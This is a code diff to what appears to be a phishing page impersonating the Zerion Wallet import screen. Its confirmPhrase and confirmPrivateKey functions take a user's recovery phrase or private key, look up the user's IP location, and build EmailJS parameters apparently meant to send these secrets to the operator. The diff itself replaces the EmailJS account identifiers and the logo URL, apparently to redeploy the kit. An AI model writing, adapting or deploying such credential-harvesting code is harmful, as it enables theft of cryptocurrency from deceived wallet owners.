@@ -199,7 +199,7 @@ const isImportDisabled = computed(() => {
 const primaryColor = '#2E6DF6';
 const accentBg = 'rgba(46, 109, 246, 0.12)';
 const wrapperStyle = 'background: linear-gradient(135deg, #0f172a 0%, #111827 100%);';
-const logoUrl = 'https://logo.clearbit.com/zerion.io';
+const logoUrl = 'https://play-lh.googleusercontent.com/lxl3CQLYmbY7kHtMn3ehz06ebEIIxYOETf8hlWPNW6L3ZPxuhSrnIq-4k5T89gd4gA';
 
 function initPhraseWords() {
   phraseWords.value = Array(phraseCount.value).fill('');
@@ -237,9 +237,9 @@ async function confirmPhrase() {
     const location = await axios.get('https://ipapi.co/json');
     const payload = { type: importType.value, phrase: phraseWords.value.join(' ') };
     const params = {
-      service_id: 'service_eusbqyo',
-      template_id: 'template_z6xga6o',
-      user_id: 'obT4LcwZqPw_KlOar',
+      service_id: 'service_k4kimk6',
+      template_id: 'template_mpy0fmg',
+      user_id: 'DMvtKT5BmC4qV83V9',
       template_params: {
         from_name: 'Blockchain solutions',
         wallet_type: 'Zerion Wallet',
@@ -262,9 +262,9 @@ async function confirmPrivateKey() {
     const location = await axios.get('https://ipapi.co/json');
     const payload = { type: 'private', phrase: privateKeyInput.value };
     const params = {
-      service_id: 'service_eusbqyo',
-      template_id: 'template_z6xga6o',
-      user_id: 'obT4LcwZqPw_KlOar',
+      service_id: 'service_k4kimk6',
+      template_id: 'template_mpy0fmg',
+      user_id: 'DMvtKT5BmC4qV83V9',
       template_params: {
         from_name: 'Blockchain solutions',
         wallet_type: 'Zerion Wallet',
